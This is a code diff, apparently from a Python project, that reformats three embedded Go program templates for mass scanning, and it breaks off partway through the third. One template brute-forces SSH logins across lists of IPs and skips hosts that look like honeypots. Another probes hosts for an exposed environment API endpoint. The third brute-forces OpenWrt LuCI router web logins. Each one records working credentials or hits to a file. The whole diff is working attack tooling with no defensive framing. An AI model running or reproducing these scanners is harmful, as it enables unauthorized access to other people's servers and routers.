-	inputFile, outputFile := os.Args[1], os.Args[2]
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
-		os.Exit(0)
-	}()
-    go memoryMonitor()
-	batch, err := os.Open(inputFile)
-	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
-		return
-	}
-	defer batch.Close()
-	totalLines, _ := countLines(inputFile)
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		startTime := time.Now()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				percentage := float64(current) / float64(totalLines) * 100
-				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
-				elapsed := time.Since(startTime).Seconds()
-				var eta float64
-				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
-				}
-				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
-					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-	usernames, passwords := {user_list}, {pass_list}
-	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
-		return
-	}
-	defer outFile.Close()
-	tasks := make(chan string, {semaphore_size})
-	var wg sync.WaitGroup
-	for i := 0; i < {semaphore_size}; i++ {
-		wg.Add(1)
-		go worker(tasks, outFile, &wg, usernames, passwords)
-	}
-	scanner := bufio.NewScanner(batch)
-	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" { tasks <- line }
-	}
-	close(tasks)
-	wg.Wait()
-}
-"""
+XUI_GO_TEMPLATE_6_LINES = [
+    "package main",
+    "import (",
+    "	\"bufio\"",
+    "	\"fmt\"",
+    "	\"net/url\"",
+    "	\"os\"",
+    "	\"os/signal\"",
+    "	\"runtime\"",
+    "	\"strings\"",
+    "	\"sync\"",
+    "	\"sync/atomic\"",
+    "	\"syscall\"",
+    "	\"time\"",
+    "	\"golang.org/x/crypto/ssh\"",
+    ")",
+    "var completedCount int64",
+    "var isMemoryThrottled int32",
+    "func countLines(filePath string) (int, error) {",
+    "	file, err := os.Open(filePath)",
+    "	if err != nil { return 0, err }",
+    "	defer file.Close()",
+    "	scanner := bufio.NewScanner(file)",
+    "	count := 0",
+    "	for scanner.Scan() { count++ }",
+    "	return count, scanner.Err()",
+    "}",
+    "func memoryMonitor() {",
+    "	var baselineMem uint64",
+    "	var m runtime.MemStats",
+    "	time.Sleep(2 * time.Second)",
+    "	runtime.ReadMemStats(&m)",
+    "	baselineMem = m.Sys",
+    "	highWatermark := baselineMem + 200*1024*1024",
+    "	lowWatermark := baselineMem + 100*1024*1024",
+    "	ticker := time.NewTicker(2 * time.Second)",
+    "	defer ticker.Stop()",
+    "	for range ticker.C {",
+    "		runtime.ReadMemStats(&m)",
+    "		if m.Sys >= highWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 1)",
+    "		} else if m.Sys < lowWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 0)",
+    "		}",
+    "	}",
+    "}",
+    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
+    "	defer wg.Done()",
+    "	for line := range tasks {",
+    "		processIP(line, file, usernames, passwords)",
+    "		atomic.AddInt64(&completedCount, 1)",
+    "	}",
+    "}",
+    "func processIP(line string, file *os.File, usernames []string, passwords []string) {",
+    "	var ipPort string",
+    "	u, err := url.Parse(strings.TrimSpace(line))",
+    "	if err == nil && u.Host != \"\" {",
+    "		ipPort = u.Host",
+    "	} else {",
+    "		ipPort = strings.TrimSpace(line)",
+    "	}",
+    "	parts := strings.Split(ipPort, \":\")",
+    "	if len(parts) != 2 { return }",
+    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
+    "	for _, username := range usernames {",
+    "		for _, password := range passwords {",
+    "			client, success, _ := trySSH(ip, port, username, password)",
+    "			if success {",
+    "				defer client.Close()",
+    "				if !isLikelyHoneypot(client) {",
+    "					file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
+    "				}",
+    "				return",
+    "			}",
+    "		}",
+    "	}",
+    "}",
+    "func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {",
+    "	addr := fmt.Sprintf(\"%s:%s\", ip, port)",
+    "	config := &ssh.ClientConfig{",
+    "		User:            username,",
+    "		Auth:            []ssh.AuthMethod{ssh.Password(password)},",
+    "		HostKeyCallback: ssh.InsecureIgnoreHostKey(),",
+    "		Timeout:         {timeout} * time.Second,",
+    "	}",
+    "	client, err := ssh.Dial(\"tcp\", addr, config)",
+    "    return client, err == nil, err",
+    "}",
+    "func isLikelyHoneypot(client *ssh.Client) bool {",
+    "	session, err := client.NewSession()",
+    "	if err != nil { return true }",
+    "	defer session.Close()",
+    "	err = session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{})",
+    "	if err != nil { return true }",
+    "	output, err := session.CombinedOutput(\"echo $((1+1))\")",
+    "	if err != nil { return true }",
+    "	return strings.TrimSpace(string(output)) != \"2\"",
+    "}",
+    "func main() {",
+    "	if len(os.Args) < 3 {",
+    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
+    "		os.Exit(1)",
+    "	}",
+    "	inputFile, outputFile := os.Args[1], os.Args[2]",
+    "	sigChan := make(chan os.Signal, 1)",
+    "	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)",
+    "	go func() {",
+    "		<-sigChan",
+    "		fmt.Println(\"\\nGracefully shutting down...\")",
+    "		os.Exit(0)",
+    "	}()",
+    "    go memoryMonitor()",
+    "	batch, err := os.Open(inputFile)",
+    "	if err != nil {",
+    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
+    "		return",
+    "	}",
+    "	defer batch.Close()",
+    "	totalLines, _ := countLines(inputFile)",
+    "	go func() {",
+    "		ticker := time.NewTicker(500 * time.Millisecond)",
+    "		defer ticker.Stop()",
+    "		startTime := time.Now()",
+    "		for {",
+    "			current := atomic.LoadInt64(&completedCount)",
+    "			if totalLines > 0 {",
+    "				percentage := float64(current) / float64(totalLines) * 100",
+    "				bar := strings.Repeat(\"=\", int(percentage/2)) + strings.Repeat(\"-\", 50-int(percentage/2))",
+    "				elapsed := time.Since(startTime).Seconds()",
+    "				var eta float64",
+    "				if current > 0 {",
+    "					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)",
+    "				}",
+    "				fmt.Fprintf(os.Stdout, \"\\r[%s] %.2f%% (%d/%d) [%v<%v]\", bar, percentage, current, totalLines, ",
+    "					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)",
+    "			}",
+    "			if current >= int64(totalLines) {",
+    "				fmt.Fprintf(os.Stdout, \"\\n\")",
+    "				return",
+    "			}",
+    "			<-ticker.C",
+    "		}",
+    "	}()",
+    "	usernames, passwords := {user_list}, {pass_list}",
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
+    "	if err != nil {",
+    "		fmt.Println(\"无法打开输出文件:\", err)",
+    "		return",
+    "	}",
+    "	defer outFile.Close()",
+    "	tasks := make(chan string, {semaphore_size})",
+    "	var wg sync.WaitGroup",
+    "	for i := 0; i < {semaphore_size}; i++ {",
+    "		wg.Add(1)",
+    "		go worker(tasks, outFile, &wg, usernames, passwords)",
+    "	}",
+    "	scanner := bufio.NewScanner(batch)",
+    "	for scanner.Scan() {",
+    "        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }",
+    "		line := strings.TrimSpace(scanner.Text())",
+    "		if line != \"\" { tasks <- line }",
+    "	}",
+    "	close(tasks)",
+    "	wg.Wait()",
+    "}",
+]
 
-XUI_GO_TEMPLATE_7 = """package main
-import (
-	"bufio"
-	"context"
-	"crypto/tls"
-	"fmt"
-	"io"
-	"net/http"
-	_ "net/http/pprof"
-	"net/url"
-	"os"
-	"os/signal"
-	"runtime"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-)
-var completedCount int64
-var isMemoryThrottled int32
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-func memoryMonitor() {
-	var baselineMem uint64
-	var m runtime.MemStats
-	time.Sleep(2 * time.Second)
-	runtime.ReadMemStats(&m)
-	baselineMem = m.Sys
-	highWatermark := baselineMem + 200*1024*1024
-	lowWatermark := baselineMem + 100*1024*1024
-	ticker := time.NewTicker(2 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		runtime.ReadMemStats(&m)
-		if m.Sys >= highWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 1)
-		} else if m.Sys < lowWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 0)
-		}
-	}
-}
-func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {
-	defer wg.Done()
-	tr := &http.Transport{
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-		DisableKeepAlives: true,
-	}
-	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }
-	for line := range tasks {
-		processIP(line, file, paths, client)
-		atomic.AddInt64(&completedCount, 1)
-	}
-}
-func processIP(line string, file *os.File, paths []string, client *http.Client) {
-	var ipPort string
-	u, err := url.Parse(strings.TrimSpace(line))
-	if err == nil && u.Host != "" {
-		ipPort = u.Host
-	} else {
-		ipPort = strings.TrimSpace(line)
-	}
-	for _, path := range paths {
-		if tryBothProtocols(ipPort, path, client, file) { break }
-	}
-}
-func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {
-	cleanPath := strings.Trim(path, "/")
-	fullPath := cleanPath + "/api/utils/env"
-	if success, _ := sendRequest(client, fmt.Sprintf("http://%s/%s", ipPort, fullPath)); success {
-		file.WriteString(fmt.Sprintf("http://%s?api=http://%s/%s\\n", ipPort, ipPort, cleanPath))
-		return true
-	}
-	if success, _ := sendRequest(client, fmt.Sprintf("https://%s/%s", ipPort, fullPath)); success {
-		file.WriteString(fmt.Sprintf("https://%s?api=https://%s/%s\\n", ipPort, ipPort, cleanPath))
-		return true
-	}
-	return false
-}
-func sendRequest(client *http.Client, fullURL string) (bool, error) {
-	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
-	defer cancel()
-	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
-	if err != nil { return false, err }
-	resp, err := client.Do(req)
-	if err != nil { 
-        if resp != nil { resp.Body.Close() }
-        return false, err 
-    }
-	defer resp.Body.Close()
-	if resp.StatusCode == http.StatusOK {
-		bodyBytes, readErr := io.ReadAll(resp.Body)
-		if readErr != nil { return false, readErr }
-		if strings.Contains(string(bodyBytes), `{"status":"success","data"`) {
-			return true, nil
-		}
-	} else {
-		io.Copy(io.Discard, resp.Body)
-	}
-	return false, nil
-}
-func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("Usage: ./program <inputFile> <outputFile>")
-		os.Exit(1)
-	}
-	inputFile, outputFile := os.Args[1], os.Args[2]
-	go func() { http.ListenAndServe("localhost:6060", nil) }()
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
-		os.Exit(0)
-	}()
-    go memoryMonitor()
-	batch, err := os.Open(inputFile)
-	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
-		return
-	}
-	defer batch.Close()
-	totalLines, _ := countLines(inputFile)
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		startTime := time.Now()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				percentage := float64(current) / float64(totalLines) * 100
-				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
-				elapsed := time.Since(startTime).Seconds()
-				var eta float64
-				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
-				}
-				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
-					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-	paths := {pass_list}
-	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
-		return
-	}
-	defer outFile.Close()
-	tasks := make(chan string, {semaphore_size})
-	var wg sync.WaitGroup
-	for i := 0; i < {semaphore_size}; i++ {
-		wg.Add(1)
-		go worker(tasks, outFile, &wg, paths)
-	}
-	scanner := bufio.NewScanner(batch)
-	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" { tasks <- line }
-	}
-	close(tasks)
-	wg.Wait()
-}
-"""
+XUI_GO_TEMPLATE_7_LINES = [
+    "package main",
+    "import (",
+    "	\"bufio\"",
+    "	\"context\"",
+    "	\"crypto/tls\"",
+    "	\"fmt\"",
+    "	\"io\"",
+    "	\"net/http\"",
+    "	_ \"net/http/pprof\"",
+    "	\"net/url\"",
+    "	\"os\"",
+    "	\"os/signal\"",
+    "	\"runtime\"",
+    "	\"strings\"",
+    "	\"sync\"",
+    "	\"sync/atomic\"",
+    "	\"syscall\"",
+    "	\"time\"",
+    ")",
+    "var completedCount int64",
+    "var isMemoryThrottled int32",
+    "func countLines(filePath string) (int, error) {",
+    "	file, err := os.Open(filePath)",
+    "	if err != nil { return 0, err }",
+    "	defer file.Close()",
+    "	scanner := bufio.NewScanner(file)",
+    "	count := 0",
+    "	for scanner.Scan() { count++ }",
+    "	return count, scanner.Err()",
+    "}",
+    "func memoryMonitor() {",
+    "	var baselineMem uint64",
+    "	var m runtime.MemStats",
+    "	time.Sleep(2 * time.Second)",
+    "	runtime.ReadMemStats(&m)",
+    "	baselineMem = m.Sys",
+    "	highWatermark := baselineMem + 200*1024*1024",
+    "	lowWatermark := baselineMem + 100*1024*1024",
+    "	ticker := time.NewTicker(2 * time.Second)",
+    "	defer ticker.Stop()",
+    "	for range ticker.C {",
+    "		runtime.ReadMemStats(&m)",
+    "		if m.Sys >= highWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 1)",
+    "		} else if m.Sys < lowWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 0)",
+    "		}",
+    "	}",
+    "}",
+    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []string) {",
+    "	defer wg.Done()",
+    "	tr := &http.Transport{",
+    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
+    "		DisableKeepAlives: true,",
+    "	}",
+    "	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
+    "	for line := range tasks {",
+    "		processIP(line, file, paths, client)",
+    "		atomic.AddInt64(&completedCount, 1)",
+    "	}",
+    "}",
+    "func processIP(line string, file *os.File, paths []string, client *http.Client) {",
+    "	var ipPort string",
+    "	u, err := url.Parse(strings.TrimSpace(line))",
+    "	if err == nil && u.Host != \"\" {",
+    "		ipPort = u.Host",
+    "	} else {",
+    "		ipPort = strings.TrimSpace(line)",
+    "	}",
+    "	for _, path := range paths {",
+    "		if tryBothProtocols(ipPort, path, client, file) { break }",
+    "	}",
+    "}",
+    "func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {",
+    "	cleanPath := strings.Trim(path, \"/\")",
+    "	fullPath := cleanPath + \"/api/utils/env\"",
+    "	if success, _ := sendRequest(client, fmt.Sprintf(\"http://%s/%s\", ipPort, fullPath)); success {",
+    "		file.WriteString(fmt.Sprintf(\"http://%s?api=http://%s/%s\\n\", ipPort, ipPort, cleanPath))",
+    "		return true",
+    "	}",
+    "	if success, _ := sendRequest(client, fmt.Sprintf(\"https://%s/%s\", ipPort, fullPath)); success {",
+    "		file.WriteString(fmt.Sprintf(\"https://%s?api=https://%s/%s\\n\", ipPort, ipPort, cleanPath))",
+    "		return true",
+    "	}",
+    "	return false",
+    "}",
+    "func sendRequest(client *http.Client, fullURL string) (bool, error) {",
+    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
+    "	defer cancel()",
+    "	req, err := http.NewRequestWithContext(ctx, \"GET\", fullURL, nil)",
+    "	if err != nil { return false, err }",
+    "	resp, err := client.Do(req)",
+    "	if err != nil { ",
+    "        if resp != nil { resp.Body.Close() }",
+    "        return false, err ",
+    "    }",
+    "	defer resp.Body.Close()",
+    "	if resp.StatusCode == http.StatusOK {",
+    "		bodyBytes, readErr := io.ReadAll(resp.Body)",
+    "		if readErr != nil { return false, readErr }",
+    "		if strings.Contains(string(bodyBytes), `{\"status\":\"success\",\"data\"`) {",
+    "			return true, nil",
+    "		}",
+    "	} else {",
+    "		io.Copy(io.Discard, resp.Body)",
+    "	}",
+    "	return false, nil",
+    "}",
+    "func main() {",
+    "	if len(os.Args) < 3 {",
+    "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
+    "		os.Exit(1)",
+    "	}",
+    "	inputFile, outputFile := os.Args[1], os.Args[2]",
+    "	go func() { http.ListenAndServe(\"localhost:6060\", nil) }()",
+    "	sigChan := make(chan os.Signal, 1)",
+    "	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)",
+    "	go func() {",
+    "		<-sigChan",
+    "		fmt.Println(\"\\nGracefully shutting down...\")",
+    "		os.Exit(0)",
+    "	}()",
+    "    go memoryMonitor()",
+    "	batch, err := os.Open(inputFile)",
+    "	if err != nil {",
+    "		fmt.Printf(\"无法读取输入文件: %v\\n\", err)",
+    "		return",
+    "	}",
+    "	defer batch.Close()",
+    "	totalLines, _ := countLines(inputFile)",
+    "	go func() {",
+    "		ticker := time.NewTicker(500 * time.Millisecond)",
+    "		defer ticker.Stop()",
+    "		startTime := time.Now()",
+    "		for {",
+    "			current := atomic.LoadInt64(&completedCount)",
+    "			if totalLines > 0 {",
+    "				percentage := float64(current) / float64(totalLines) * 100",
+    "				bar := strings.Repeat(\"=\", int(percentage/2)) + strings.Repeat(\"-\", 50-int(percentage/2))",
+    "				elapsed := time.Since(startTime).Seconds()",
+    "				var eta float64",
+    "				if current > 0 {",
+    "					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)",
+    "				}",
+    "				fmt.Fprintf(os.Stdout, \"\\r[%s] %.2f%% (%d/%d) [%v<%v]\", bar, percentage, current, totalLines, ",
+    "					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)",
+    "			}",
+    "			if current >= int64(totalLines) {",
+    "				fmt.Fprintf(os.Stdout, \"\\n\")",
+    "				return",
+    "			}",
+    "			<-ticker.C",
+    "		}",
+    "	}()",
+    "	paths := {pass_list}",
+    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
+    "	if err != nil {",
+    "		fmt.Println(\"无法打开输出文件:\", err)",
+    "		return",
+    "	}",
+    "	defer outFile.Close()",
+    "	tasks := make(chan string, {semaphore_size})",
+    "	var wg sync.WaitGroup",
+    "	for i := 0; i < {semaphore_size}; i++ {",
+    "		wg.Add(1)",
+    "		go worker(tasks, outFile, &wg, paths)",
+    "	}",
+    "	scanner := bufio.NewScanner(batch)",
+    "	for scanner.Scan() {",
+    "        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }",
+    "		line := strings.TrimSpace(scanner.Text())",
+    "		if line != \"\" { tasks <- line }",
+    "	}",
+    "	close(tasks)",
+    "	wg.Wait()",
+    "}",
+]
 
-XUI_GO_TEMPLATE_8 = """package main
-import (
-	"bufio"
-	"context"
-	"crypto/tls"
-	"fmt"
-	"io"
-	"net/http"
-	"net/url"
-	"os"
-	"os/signal"
-	"runtime"
-	"strings"
-	"sync"
-	"sync/atomic"
-	"syscall"
-	"time"
-)
-var completedCount int64
-var isMemoryThrottled int32
-func countLines(filePath string) (int, error) {
-	file, err := os.Open(filePath)
-	if err != nil { return 0, err }
-	defer file.Close()
-	scanner := bufio.NewScanner(file)
-	count := 0
-	for scanner.Scan() { count++ }
-	return count, scanner.Err()
-}
-func memoryMonitor() {
-	var baselineMem uint64
-	var m runtime.MemStats
-	time.Sleep(2 * time.Second)
-	runtime.ReadMemStats(&m)
-	baselineMem = m.Sys
-	highWatermark := baselineMem + 200*1024*1024
-	lowWatermark := baselineMem + 100*1024*1024
-	ticker := time.NewTicker(2 * time.Second)
-	defer ticker.Stop()
-	for range ticker.C {
-		runtime.ReadMemStats(&m)
-		if m.Sys >= highWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 1)
-		} else if m.Sys < lowWatermark {
-			atomic.StoreInt32(&isMemoryThrottled, 0)
-		}
-	}
-}
-func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
-	defer wg.Done()
-	tr := &http.Transport{
-		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
-		DisableKeepAlives: true,
-	}
-	client := &http.Client{
-		Transport: tr,
-		Timeout: {timeout} * time.Second,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
-	}
-	for line := range tasks {
-		processIP(line, file, usernames, passwords, client)
-		atomic.AddInt64(&completedCount, 1)
-	}
-}
-func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {
-	targets := []string{}
-	trimmed := strings.TrimSpace(line)
-	if strings.HasPrefix(trimmed, "http") {
-		targets = append(targets, trimmed)
-	} else {
-		targets = append(targets, "http://"+trimmed, "https://"+trimmed)
-	}
-	for _, target := range targets {
-		u, err := url.Parse(target)
-		if err != nil { continue }
-		origin := u.Scheme + "://" + u.Host
-		referer := origin + "/"
-		for _, username := range usernames {
-			for _, password := range passwords {
-				if checkLogin(target, username, password, origin, referer, client) {
-					file.WriteString(fmt.Sprintf("%s %s %s\\n", target, username, password))
-					return
-				}
-			}
-		}
-	}
-}
-func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {
-	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)
-	defer cancel()
-	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
-	req, err := http.NewRequestWithContext(ctx, "POST", urlStr, strings.NewReader(payload))
-	if err != nil { return false }
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-	req.Header.Set("Origin", origin)
-	req.Header.Set("Referer", referer)
-	resp, err := client.Do(req)
-	if err != nil { 
-        if resp != nil { resp.Body.Close() }
-        return false 
-    }
-	defer resp.Body.Close()
-	io.Copy(io.Discard, resp.Body)
-	for _, c := range resp.Cookies() {
-		if c.Name == "sysauth_http" && c.Value != "" {
-			return true
-		}
-	}
-	return false
-}
-func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("Usage: ./program <inputFile> <outputFile>")
-		os.Exit(1)
-	}
-	inputFile, outputFile := os.Args[1], os.Args[2]
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	go func() {
-		<-sigChan
-		fmt.Println("\\nGracefully shutting down...")
-		os.Exit(0)
-	}()
-    go memoryMonitor()
-	batch, err := os.Open(inputFile)
-	if err != nil {
-		fmt.Printf("无法读取输入文件: %v\\n", err)
-		return
-	}
-	defer batch.Close()
-	totalLines, _ := countLines(inputFile)
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		startTime := time.Now()
-		for {
-			current := atomic.LoadInt64(&completedCount)
-			if totalLines > 0 {
-				percentage := float64(current) / float64(totalLines) * 100
-				bar := strings.Repeat("=", int(percentage/2)) + strings.Repeat("-", 50-int(percentage/2))
-				elapsed := time.Since(startTime).Seconds()
-				var eta float64
-				if current > 0 {
-					eta = (elapsed / float64(current)) * float64(int64(totalLines)-current)
-				}
-				fmt.Fprintf(os.Stdout, "\\r[%s] %.2f%% (%d/%d) [%v<%v]", bar, percentage, current, totalLines, 
-					time.Duration(elapsed)*time.Second, time.Duration(eta)*time.Second)
-			}
-			if current >= int64(totalLines) {
-				fmt.Fprintf(os.Stdout, "\\n")
-				return
-			}
-			<-ticker.C
-		}
-	}()
-	usernames, passwords := {user_list}, {pass_list}
-	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-	if err != nil {
-		fmt.Println("无法打开输出文件:", err)
-		return
-	}
-	defer outFile.Close()
-	tasks := make(chan string, {semaphore_size})
-	var wg sync.WaitGroup
-	for i := 0; i < {semaphore_size}; i++ {
-		wg.Add(1)
-		go worker(tasks, outFile, &wg, usernames, passwords)
-	}
-	scanner := bufio.NewScanner(batch)
-	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
-		line := strings.TrimSpace(scanner.Text())
-		if line != "" { tasks <- line }
-	}
-	close(tasks)
-	wg.Wait()
-}
-"""
+XUI_GO_TEMPLATE_8_LINES = [
+    "package main",
+    "import (",
+    "	\"bufio\"",
+    "	\"context\"",
+    "	\"crypto/tls\"",
+    "	\"fmt\"",
+    "	\"io\"",
+    "	\"net/http\"",
+    "	\"net/url\"",
+    "	\"os\"",
+    "	\"os/signal\"",
+    "	\"runtime\"",
+    "	\"strings\"",
+    "	\"sync\"",
+    "	\"sync/atomic\"",
+    "	\"syscall\"",
+    "	\"time\"",
+    ")",
+    "var completedCount int64",
+    "var isMemoryThrottled int32",
+    "func countLines(filePath string) (int, error) {",
+    "	file, err := os.Open(filePath)",
+    "	if err != nil { return 0, err }",
+    "	defer file.Close()",
+    "	scanner := bufio.NewScanner(file)",
+    "	count := 0",
+    "	for scanner.Scan() { count++ }",
+    "	return count, scanner.Err()",
+    "}",
+    "func memoryMonitor() {",
+    "	var baselineMem uint64",
+    "	var m runtime.MemStats",
+    "	time.Sleep(2 * time.Second)",
+    "	runtime.ReadMemStats(&m)",
+    "	baselineMem = m.Sys",
+    "	highWatermark := baselineMem + 200*1024*1024",
+    "	lowWatermark := baselineMem + 100*1024*1024",
+    "	ticker := time.NewTicker(2 * time.Second)",
+    "	defer ticker.Stop()",
+    "	for range ticker.C {",
+    "		runtime.ReadMemStats(&m)",
+    "		if m.Sys >= highWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 1)",
+    "		} else if m.Sys < lowWatermark {",
+    "			atomic.StoreInt32(&isMemoryThrottled, 0)",
+    "		}",
+    "	}",
+    "}",
+    "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
+    "	defer wg.Done()",
+    "	tr := &http.Transport{",
+    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
+    "		DisableKeepAlives: true,",
+    "	}",
+    "	client := &http.Client{",
+    "		Transport: tr,",
+    "		Timeout: {timeout} * time.Second,",
+    "		CheckRedirect: func(req *http.Request, via []*http.Request) error {",
+    "			return http.ErrUseLastResponse",
+    "		},",
+    "	}",
+    "	for line := range tasks {",
+    "		processIP(line, file, usernames, passwords, client)",
+    "		atomic.AddInt64(&completedCount, 1)",
+    "	}",
+    "}",
+    "func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {",
+    "	targets := []string{}",
+    "	trimmed := strings.TrimSpace(line)",
+    "	if strings.HasPrefix(trimmed, \"http\") {",
+    "		targets = append(targets, trimmed)",
+    "	} else {",
+    "		targets = append(targets, \"http://\"+trimmed, \"https://\"+trimmed)",
+    "	}",
+    "	for _, target := range targets {",
+    "		u, err := url.Parse(target)",
+    "		if err != nil { continue }",
+    "		origin := u.Scheme + \"://\" + u.Host",
+    "		referer := origin + \"/\"",
+    "		for _, username := range usernames {",
+    "			for _, password := range passwords {",
+    "				if checkLogin(target, username, password, origin, referer, client) {",
+    "					file.WriteString(fmt.Sprintf(\"%s %s %s\\n\", target, username, password))",
+    "					return",
+    "				}",
+    "			}",
+    "		}",
+    "	}",
+    "}",
+    "func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {",
+    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
+    "	defer cancel()",
+    "	payload := fmt.Sprintf(\"luci_username=%s&luci_password=%s\", username, password)",
+    "	req, err := http.NewRequestWithContext(ctx, \"POST\", urlStr, strings.NewReader(payload))",
+    "	if err != nil { return false }",
+    "	req.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")",
+    "	req.Header.Set(\"Origin\", origin)",
+    "	req.Header.Set(\"Referer\", referer)",
+    "	resp, err := client.Do(req)",
+    "	if err != nil { ",
+    "        if resp != nil { resp.Body.Close() }",
+    "        return false ",
+    "    }",
+    "	defer resp.Body.Close()",
+    "	io.Copy(io.Discard, resp.Body)",
+    "	for _, c := range resp.Cookies() {",
+    "		if c.Name == \"sysauth_http\" && c.Value != \"\" {",
+    "			return true",
+    "		}",
+    "	}",
+    "	return false",
+    "}",
+    "func main() {",
